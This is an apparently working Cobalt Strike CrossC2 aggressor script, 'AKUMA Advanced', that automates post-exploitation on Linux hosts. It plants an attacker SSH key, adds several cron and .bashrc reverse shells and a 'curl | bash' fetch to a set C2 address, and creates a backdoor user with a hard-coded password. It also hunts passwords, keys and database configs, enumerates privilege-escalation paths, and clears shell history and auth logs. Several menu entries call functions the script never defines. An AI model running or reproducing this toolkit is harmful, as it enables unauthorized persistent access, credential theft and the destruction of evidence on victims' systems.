# AKUMA Advanced CrossC2 - Complete Post-Exploitation Playbook
# Based on working akuma_simple_crossc2.cna with extended functionality

# Configuration
%akuma_config = %(
    c2_server => "192.168.1.17",
    backup_ports => @(4444, 5555, 6666, 7777, 8888, 9999),
    ssh_key => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vYZ..."
);

popup ssh {
    separator();
    menu "&AKUMA Advanced" {
        # Phase 1: Immediate Actions
        menu "&Phase 1: Stabilize" {
            item "&Quick Stabilize (2min)" {
                akuma_phase1_stabilize($1);
            }
            item "&Emergency Backdoors" {
                akuma_phase1_backdoors($1);
            }
        }
        
        # Phase 2: Reconnaissance  
        menu "&Phase 2: Recon" {
            item "&System Enumeration" {
                akuma_phase2_system($1);
            }
            item "&Network Discovery" {
                akuma_phase2_network($1);
            }
            item "&Process Analysis" {
                akuma_phase2_processes($1);
            }
        }
        
        # Phase 3: Credential Hunting
        menu "&Phase 3: Credentials" {
            item "&Password Hunt" {
                akuma_phase3_passwords($1);
            }
            item "&SSH Keys Search" {
                akuma_phase3_keys($1);
            }
            item "&Database Configs" {
                akuma_phase3_databases($1);
            }
        }
        
        # Phase 4: Privilege Escalation
        menu "&Phase 4: PrivEsc" {
            item "&SUID/Capabilities" {
                akuma_phase4_suid($1);
            }
            item "&Sudo & Cron Check" {
                akuma_phase4_sudo($1);
            }
            item "&Kernel & Software" {
                akuma_phase4_kernel($1);
            }
        }
        
        # Phase 5: Persistence
        menu "&Phase 5: Persistence" {
            item "&Advanced Cron" {
                akuma_phase5_cron($1);
            }
            item "&Profile Backdoors" {
                akuma_phase5_profiles($1);
            }
            item "&Service Persistence" {
                akuma_phase5_services($1);
            }
        }
        
        # Phase 6: Data Collection
        menu "&Phase 6: Data Hunt" {
            item "&Sensitive Files" {
                akuma_phase6_files($1);
            }
            item "&Browser Data" {
                akuma_phase6_browsers($1);
            }
            item "&Database Extraction" {
                akuma_phase6_databases($1);
            }
        }
        
        # Phase 7: Lateral Movement
        menu "&Phase 7: Lateral" {
            item "&Trust Relationships" {
                akuma_phase7_trust($1);
            }
            item "&Network Shares" {
                akuma_phase7_shares($1);
            }
            item "&Service Enumeration" {
                akuma_phase7_services($1);
            }
        }
        
        separator();
        item "&Full Auto Playbook (30min)" {
            akuma_full_playbook($1);
        }
        item "&Quick Playbook (10min)" {
            akuma_quick_playbook($1);
        }
        separator();
        item "&Cleanup & Exit" {
            akuma_cleanup_stealth($1);
        }
        item "&Show Config" {
            akuma_show_config($1);
        }
    }
}

# ============================================================================
# PHASE 1: STABILIZATION & EMERGENCY BACKDOORS
# ============================================================================

sub akuma_phase1_stabilize {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 1: Stabilization");
    blog($bid, "üî• AKUMA Phase 1: Stabilizing session and creating emergency access...");
    
    bshell($bid, "echo '=== PHASE 1: STABILIZATION ==='");
    bshell($bid, "whoami && hostname && pwd && date");
    bshell($bid, "ps aux | grep $$ | grep -v grep");
    
    # Basic environment setup
    bshell($bid, "export HISTFILE=/dev/null && unset HISTFILE && history -c");
    bshell($bid, "mkdir -p /tmp/.akuma && chmod 755 /tmp/.akuma");
    bshell($bid, "mkdir -p ~/.config && chmod 755 ~/.config");
    
    # Test network connectivity
    local('$server');
    $server = %akuma_config["c2_server"];
    bshell($bid, "ping -c 1 " . $server . " && echo 'C2 connectivity: OK' || echo 'C2 connectivity: FAILED'");
    
    # Basic system info
    bshell($bid, "echo '=== BASIC SYSTEM INFO ==='");
    bshell($bid, "uname -a");
    bshell($bid, "cat /etc/os-release | head -5");
    bshell($bid, "id && groups");
    bshell($bid, "uptime");
    
    blog($bid, "‚úÖ Phase 1: Stabilization complete!");
}

sub akuma_phase1_backdoors {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 1: Emergency Backdoors");
    blog($bid, "üö™ Installing emergency backdoors for persistent access...");
    
    local('$server @ports $ssh_key');
    $server = %akuma_config["c2_server"];
    @ports = %akuma_config["backup_ports"];
    $ssh_key = %akuma_config["ssh_key"];
    
    bshell($bid, "echo '=== INSTALLING EMERGENCY BACKDOORS ==='");
    
    # SSH backdoor
    bshell($bid, "mkdir -p ~/.ssh && chmod 700 ~/.ssh");
    bshell($bid, "echo '" . $ssh_key . "' >> ~/.ssh/authorized_keys");
    bshell($bid, "chmod 600 ~/.ssh/authorized_keys");
    bshell($bid, "echo 'SSH backdoor installed'");
    
    # Cron backdoors (multiple)
    bshell($bid, "(crontab -l 2>/dev/null; echo '*/10 * * * * /bin/bash -i >& /dev/tcp/" . $server . "/" . @ports[0] . " 0>&1') | crontab -");
    bshell($bid, "(crontab -l 2>/dev/null; echo '*/15 * * * * curl -s http://" . $server . "/shell.sh | bash') | crontab -");
    bshell($bid, "(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -i >& /dev/tcp/" . $server . "/" . @ports[1] . " 0>&1') | crontab -");
    
    # Profile backdoor
    bshell($bid, "echo 'nohup bash -i >& /dev/tcp/" . $server . "/" . @ports[2] . " 0>&1 &' >> ~/.bashrc");
    
    # Backup user (if root)
    bshell($bid, "if [ '$EUID' -eq 0 ]; then useradd -m -s /bin/bash backup_user && echo 'backup_user:P@ssw0rd123' | chpasswd && echo 'Backup user created'; fi");
    
    bshell($bid, "echo 'Emergency backdoors installation complete'");
    blog($bid, "‚úÖ Emergency backdoors installed!");
}

# ============================================================================
# PHASE 2: RECONNAISSANCE
# ============================================================================

sub akuma_phase2_system {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 2: System Enumeration");
    blog($bid, "üîç Phase 2: Comprehensive system enumeration...");
    
    bshell($bid, "echo '=== PHASE 2: SYSTEM ENUMERATION ==='");
    
    # Detailed system info
    bshell($bid, "echo '=== SYSTEM DETAILS ==='");
    bshell($bid, "hostname && hostnamectl 2>/dev/null");
    bshell($bid, "uname -a");
    bshell($bid, "cat /etc/os-release");
    bshell($bid, "cat /proc/version");
    bshell($bid, "uptime && date");
    bshell($bid, "timedatectl 2>/dev/null");
    
    # Hardware info
    bshell($bid, "echo '=== HARDWARE INFO ==='");
    bshell($bid, "lscpu | head -10");
    bshell($bid, "free -h");
    bshell($bid, "df -h | head -10");
    bshell($bid, "lsblk 2>/dev/null");
    
    # User context
    bshell($bid, "echo '=== USER CONTEXT ==='");
    bshell($bid, "whoami && id && groups");
    bshell($bid, "sudo -l 2>/dev/null");
    bshell($bid, "cat /etc/passwd | grep bash");
    bshell($bid, "last -n 10");
    bshell($bid, "w && who");
    
    # Environment
    bshell($bid, "echo '=== ENVIRONMENT ==='");
    bshell($bid, "env | grep -E 'PATH|HOME|USER|SHELL'");
    bshell($bid, "echo $PATH");
    
    blog($bid, "‚úÖ Phase 2: System enumeration complete!");
}

sub akuma_phase2_network {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 2: Network Discovery");
    blog($bid, "üåê Phase 2: Network discovery and enumeration...");
    
    bshell($bid, "echo '=== PHASE 2: NETWORK DISCOVERY ==='");
    
    # Network configuration
    bshell($bid, "echo '=== NETWORK CONFIG ==='");
    bshell($bid, "ip addr show 2>/dev/null || ifconfig");
    bshell($bid, "ip route 2>/dev/null || route -n");
    bshell($bid, "cat /etc/resolv.conf");
    bshell($bid, "cat /etc/hosts | grep -v '^#'");
    
    # Active connections
    bshell($bid, "echo '=== NETWORK CONNECTIONS ==='");
    bshell($bid, "ss -tlnp 2>/dev/null | head -20");
    bshell($bid, "ss -anp 2>/dev/null | grep ESTABLISHED | head -15");
    bshell($bid, "arp -a 2>/dev/null");
    
    # Network discovery
    bshell($bid, "echo '=== PING SWEEP ==='");
    bshell($bid, "ping -c 1 -W 1 192.168.1.1 && echo '192.168.1.1 alive' || echo '192.168.1.1 down'");
    bshell($bid, "ping -c 1 -W 1 10.0.0.1 && echo '10.0.0.1 alive' || echo '10.0.0.1 down'");
    bshell($bid, "ping -c 1 -W 1 172.16.0.1 && echo '172.16.0.1 alive' || echo '172.16.0.1 down'");
    
    # Port scan localhost
    bshell($bid, "echo '=== LOCALHOST PORT SCAN ==='");
    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/22' && echo 'SSH (22) open'");
    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/80' && echo 'HTTP (80) open'");
    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/443' && echo 'HTTPS (443) open'");
    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/3306' && echo 'MySQL (3306) open'");
    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/5432' && echo 'PostgreSQL (5432) open'");
    
    blog($bid, "‚úÖ Phase 2: Network discovery complete!");
}

sub akuma_phase2_processes {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 2: Process Analysis");
    blog($bid, "‚öôÔ∏è Phase 2: Process and service analysis...");
    
    bshell($bid, "echo '=== PHASE 2: PROCESS ANALYSIS ==='");
    
    # Running processes
    bshell($bid, "echo '=== RUNNING PROCESSES ==='");
    bshell($bid, "ps aux --sort=-%cpu | head -20");
    bshell($bid, "ps aux --sort=-%mem | head -20");
    
    # Services
    bshell($bid, "echo '=== SERVICES ==='");
    bshell($bid, "systemctl list-units --type=service --state=running 2>/dev/null | head -20");
    bshell($bid, "service --status-all 2>/dev/null | grep '+' | head -15");
    
    # Interesting processes
    bshell($bid, "echo '=== INTERESTING PROCESSES ==='");
    bshell($bid, "ps aux | grep -E 'mysql|postgres|apache|nginx|ssh|docker' | grep -v grep");
    
    # Process tree
    bshell($bid, "echo '=== PROCESS TREE ==='");
    bshell($bid, "pstree -p 2>/dev/null | head -20");
    
    blog($bid, "‚úÖ Phase 2: Process analysis complete!");
}

# ============================================================================
# PHASE 3: CREDENTIAL HUNTING
# ============================================================================

sub akuma_phase3_passwords {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 3: Password Hunt");
    blog($bid, "üîê Phase 3: Hunting for passwords and secrets...");
    
    bshell($bid, "echo '=== PHASE 3: PASSWORD HUNT ==='");
    
    # Command history
    bshell($bid, "echo '=== COMMAND HISTORY SECRETS ==='");
    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i -E 'pass|secret|key|token' | head -10");
    bshell($bid, "cat ~/.zsh_history 2>/dev/null | grep -i -E 'pass|secret|key|token' | head -10");
    
    # Environment variables
    bshell($bid, "echo '=== ENVIRONMENT SECRETS ==='");
    bshell($bid, "env | grep -i -E 'pass|secret|key|token|api'");
    bshell($bid, "printenv | grep -i -E 'pass|secret|key|token|api'");
    
    # Config files
    bshell($bid, "echo '=== CONFIG FILE SECRETS ==='");
    bshell($bid, "find /home -name '*.conf' -o -name '*.config' -o -name '*.ini' 2>/dev/null | head -10");
    bshell($bid, "find /home -name '*.txt' 2>/dev/null | xargs grep -l -i password 2>/dev/null | head -10");
    
    # Web application configs
    bshell($bid, "echo '=== WEB CONFIG HUNT ==='");
    bshell($bid, "find /var/www /opt -name '*.php' -o -name '*.py' -o -name '*.js' 2>/dev/null | head -10");
    bshell($bid, "ls -la /var/www/*/config* 2>/dev/null");
    
    blog($bid, "‚úÖ Phase 3: Password hunt complete!");
}

sub akuma_phase3_keys {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 3: SSH Keys Search");
    blog($bid, "üîë Phase 3: Searching for SSH keys and certificates...");
    
    bshell($bid, "echo '=== PHASE 3: SSH KEYS SEARCH ==='");
    
    # SSH keys
    bshell($bid, "echo '=== SSH PRIVATE KEYS ==='");
    bshell($bid, "find /home -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null");
    bshell($bid, "find /home -name '*.pem' -o -name '*.key' 2>/dev/null | head -10");
    
    # SSH public keys and authorized_keys
    bshell($bid, "echo '=== SSH PUBLIC KEYS ==='");
    bshell($bid, "find /home -name 'authorized_keys' 2>/dev/null");
    bshell($bid, "find /home -name 'known_hosts' 2>/dev/null");
    bshell($bid, "cat ~/.ssh/authorized_keys 2>/dev/null | head -5");
    bshell($bid, "cat ~/.ssh/known_hosts 2>/dev/null | head -5");
    
    # SSL certificates
    bshell($bid, "echo '=== SSL CERTIFICATES ==='");
    bshell($bid, "find /etc /opt /var -name '*.crt' -o -name '*.pem' -o -name '*.p12' 2>/dev/null | head -15");
    
    # Check for weak SSH config
    bshell($bid, "echo '=== SSH CONFIG ==='");
    bshell($bid, "cat /etc/ssh/sshd_config | grep -v '^#' | grep -v '^$'");
    
    blog($bid, "‚úÖ Phase 3: SSH keys search complete!");
}

sub akuma_phase3_databases {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 3: Database Configs");
    blog($bid, "üóÉÔ∏è Phase 3: Searching for database configurations and credentials...");
    
    bshell($bid, "echo '=== PHASE 3: DATABASE CONFIGS ==='");
    
    # MySQL
    bshell($bid, "echo '=== MYSQL CONFIGS ==='");
    bshell($bid, "find /etc -name 'my.cnf' 2>/dev/null");
    bshell($bid, "find /home /var /opt -name 'my.cnf' 2>/dev/null");
    bshell($bid, "cat /etc/mysql/my.cnf 2>/dev/null | grep -v '^#' | grep -v '^$'");
    
    # PostgreSQL
    bshell($bid, "echo '=== POSTGRESQL CONFIGS ==='");
    bshell($bid, "find /etc -name 'postgresql.conf' -o -name 'pg_hba.conf' 2>/dev/null");
    bshell($bid, "ls -la /var/lib/postgresql 2>/dev/null");
    
    # MongoDB
    bshell($bid, "echo '=== MONGODB CONFIGS ==='");
    bshell($bid, "cat /etc/mongod.conf 2>/dev/null");
    
    # SQLite databases
    bshell($bid, "echo '=== SQLITE DATABASES ==='");
    bshell($bid, "find /home /var /opt -name '*.db' -o -name '*.sqlite*' 2>/dev/null | head -20");
    
    # Database connection strings in code
    bshell($bid, "echo '=== DB CONNECTION STRINGS ==='");
    bshell($bid, "grep -r -i -E 'database|db_|mysql|postgres' /var/www 2>/dev/null | head -10");
    
    blog($bid, "‚úÖ Phase 3: Database configs search complete!");
}

# ============================================================================
# PHASE 4: PRIVILEGE ESCALATION RECONNAISSANCE
# ============================================================================

sub akuma_phase4_suid {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 4: SUID/Capabilities Check");
    blog($bid, "üöÄ Phase 4: Checking for privilege escalation vectors...");
    
    bshell($bid, "echo '=== PHASE 4: SUID/CAPABILITIES ==='");
    
    # SUID binaries
    bshell($bid, "echo '=== SUID BINARIES ==='");
    bshell($bid, "find / -perm -4000 -type f 2>/dev/null | head -30");
    
    # SGID binaries
    bshell($bid, "echo '=== SGID BINARIES ==='");
    bshell($bid, "find / -perm -2000 -type f 2>/dev/null | head -30");
    
    # Capabilities
    bshell($bid, "echo '=== CAPABILITIES ==='");
    bshell($bid, "getcap -r / 2>/dev/null");
    
    # World writable directories
    bshell($bid, "echo '=== WORLD WRITABLE DIRECTORIES ==='");
    bshell($bid, "find / -writable -type d 2>/dev/null | grep -v -E 'proc|sys|dev' | head -20");
    
    # Interesting writable files
    bshell($bid, "echo '=== WRITABLE SYSTEM FILES ==='");
    bshell($bid, "find / -writable -type f 2>/dev/null | grep -E 'passwd|shadow|sudoers|crontab' 2>/dev/null");
    
    blog($bid, "‚úÖ Phase 4: SUID/Capabilities check complete!");
}

sub akuma_phase4_sudo {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 4: Sudo & Cron Check");
    blog($bid, "üëë Phase 4: Checking sudo configuration and cron jobs...");
    
    bshell($bid, "echo '=== PHASE 4: SUDO & CRON ==='");
    
    # Sudo configuration
    bshell($bid, "echo '=== SUDO CONFIG ==='");
    bshell($bid, "sudo -l 2>/dev/null");
    bshell($bid, "cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'");
    bshell($bid, "find /etc/sudoers.d -type f 2>/dev/null");
    
    # Cron jobs
    bshell($bid, "echo '=== CRON JOBS ==='");
    bshell($bid, "crontab -l 2>/dev/null");
    bshell($bid, "cat /etc/crontab 2>/dev/null");
    bshell($bid, "ls -la /etc/cron* 2>/dev/null");
    bshell($bid, "find /var/spool/cron -type f 2>/dev/null");
    
    # Check for writable cron files
    bshell($bid, "echo '=== WRITABLE CRON FILES ==='");
    bshell($bid, "find /etc/cron* -writable 2>/dev/null");
    
    blog($bid, "‚úÖ Phase 4: Sudo & Cron check complete!");
}

sub akuma_phase4_kernel {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 4: Kernel & Software Versions");
    blog($bid, "üêß Phase 4: Checking kernel and software versions for exploits...");
    
    bshell($bid, "echo '=== PHASE 4: KERNEL & SOFTWARE ==='");
    
    # Kernel information
    bshell($bid, "echo '=== KERNEL INFO ==='");
    bshell($bid, "uname -a");
    bshell($bid, "cat /proc/version");
    bshell($bid, "cat /etc/issue");
    bshell($bid, "lsb_release -a 2>/dev/null");
    
    # Installed packages
    bshell($bid, "echo '=== INSTALLED SOFTWARE ==='");
    bshell($bid, "dpkg -l 2>/dev/null | grep -E 'kernel|sudo|openssh|apache|nginx' | head -10");
    bshell($bid, "rpm -qa 2>/dev/null | grep -E 'kernel|sudo|openssh|apache|nginx' | head -10");
    
    # Vulnerable software check
    bshell($bid, "echo '=== VERSION CHECK ==='");
    bshell($bid, "apache2 -v 2>/dev/null");
    bshell($bid, "nginx -v 2>/dev/null");
    bshell($bid, "ssh -V 2>&1");
    bshell($bid, "sudo --version | head -1");
    
    blog($bid, "‚úÖ Phase 4: Kernel & Software check complete!");
}

# ============================================================================
# AUTOMATION: FULL PLAYBOOKS
# ============================================================================

sub akuma_quick_playbook {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Quick Playbook (10 minutes)");
    blog($bid, "‚ö° Starting AKUMA Quick Playbook - Essential actions only...");
    
    # Phase 1: Stabilize
    akuma_phase1_stabilize($bid);
    sleep(2000);
    
    # Phase 1: Backdoors
    akuma_phase1_backdoors($bid);
    sleep(2000);
    
    # Phase 2: Basic recon
    akuma_phase2_system($bid);
    sleep(2000);
    
    # Phase 3: Quick credential hunt
    akuma_phase3_passwords($bid);
    sleep(2000);
    
    # Phase 4: Basic PrivEsc check
    akuma_phase4_suid($bid);
    
    blog($bid, "üéâ AKUMA Quick Playbook Complete! Essential reconnaissance and persistence done.");
}

sub akuma_full_playbook {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Full Playbook (30 minutes)");
    blog($bid, "üî• Starting AKUMA Full Playbook - Complete post-exploitation automation...");
    
    # Phase 1: Stabilization
    blog($bid, "Starting Phase 1: Stabilization...");
    akuma_phase1_stabilize($bid);
    sleep(3000);
    akuma_phase1_backdoors($bid);
    sleep(3000);
    
    # Phase 2: Reconnaissance
    blog($bid, "Starting Phase 2: Reconnaissance...");
    akuma_phase2_system($bid);
    sleep(3000);
    akuma_phase2_network($bid);
    sleep(3000);
    akuma_phase2_processes($bid);
    sleep(3000);
    
    # Phase 3: Credential Hunting
    blog($bid, "Starting Phase 3: Credential Hunting...");
    akuma_phase3_passwords($bid);
    sleep(3000);
    akuma_phase3_keys($bid);
    sleep(3000);
    akuma_phase3_databases($bid);
    sleep(3000);
    
    # Phase 4: Privilege Escalation
    blog($bid, "Starting Phase 4: Privilege Escalation Recon...");
    akuma_phase4_suid($bid);
    sleep(3000);
    akuma_phase4_sudo($bid);
    sleep(3000);
    akuma_phase4_kernel($bid);
    
    blog($bid, "üéâ AKUMA Full Playbook Complete! Comprehensive post-exploitation finished.");
}

# ============================================================================
# ADVANCED PERSISTENCE
# ============================================================================

sub akuma_phase5_cron {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Phase 5: Advanced Cron Persistence");
    blog($bid, "‚è∞ Installing advanced cron persistence mechanisms...");
    
    local('$server @ports');
    $server = %akuma_config["c2_server"];
    @ports = %akuma_config["backup_ports"];
    
    bshell($bid, "echo '=== ADVANCED CRON PERSISTENCE ==='");
    
    # Multiple cron backdoors
    bshell($bid, "(crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/" . $server . "/" . @ports[0] . " 0>&1') | crontab -");
    bshell($bid, "(crontab -l 2>/dev/null; echo '*/12 * * * * curl -s http://" . $server . "/s | bash') | crontab -");
    bshell($bid, "(crontab -l 2>/dev/null; echo '0 */2 * * * /bin/bash -i >& /dev/tcp/" . $server . "/" . @ports[1] . " 0>&1') | crontab -");
    bshell($bid, "(crontab -l 2>/dev/null; echo '@hourly /bin/bash -i >& /dev/tcp/" . $server . "/" . @ports[2] . " 0>&1') | crontab -");
    
    # System-wide cron (if root)
    bshell($bid, "if [ '$EUID' -eq 0 ]; then echo '*/20 * * * * root /bin/bash -i >& /dev/tcp/" . $server . "/" . @ports[3] . " 0>&1' >> /etc/crontab; fi");
    
    # Verify installation
    bshell($bid, "crontab -l | grep -c tcp");
    
    blog($bid, "‚úÖ Advanced cron persistence installed!");
}

# ============================================================================
# UTILITIES
# ============================================================================

sub akuma_show_config {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Configuration");
    blog($bid, "‚öôÔ∏è AKUMA Advanced Configuration:");
    blog($bid, "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ");
    blog($bid, "C2 Server: " . %akuma_config["c2_server"]);
    blog($bid, "Backup Ports: " . join(", ", %akuma_config["backup_ports"]));
    blog($bid, "SSH Key: " . substr(%akuma_config["ssh_key"], 0, 40) . "...");
    blog($bid, "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ");
    blog($bid, "Available Phases: 1-Stabilize, 2-Recon, 3-Creds, 4-PrivEsc, 5-Persist");
    blog($bid, "Playbooks: Quick (10min), Full (30min)");
}

sub akuma_cleanup_stealth {
    local('$bid');
    $bid = $1;
    
    binput($bid, "# AKUMA Cleanup & Stealth Mode");
    blog($bid, "üßπ Cleaning up traces and enabling stealth mode...");
    
    bshell($bid, "echo '=== CLEANING TRACES ==='");
    
    # Clear histories
    bshell($bid, "history -c");
    bshell($bid, "unset HISTFILE");
    bshell($bid, "export HISTFILE=/dev/null");
    bshell($bid, "> ~/.bash_history");
    bshell($bid, "> ~/.zsh_history");
    
    # Remove temp files
    bshell($bid, "rm -rf /tmp/.akuma*");
    bshell($bid, "rm -rf /var/tmp/.akuma*");
    
    # Log cleanup (if possible)
    bshell($bid, "if [ '$EUID' -eq 0 ]; then > /var/log/auth.log 2>/dev/null; > /var/log/secure 2>/dev/null; echo 'System logs cleared'; fi");
    
    bshell($bid, "echo 'Cleanup complete - going stealth'");
    blog($bid, "‚úÖ Cleanup complete! System traces minimized.");
}

blog("üî• AKUMA Advanced CrossC2 PostEx Loaded! Full automation playbook ready. Right-click to access all phases.");
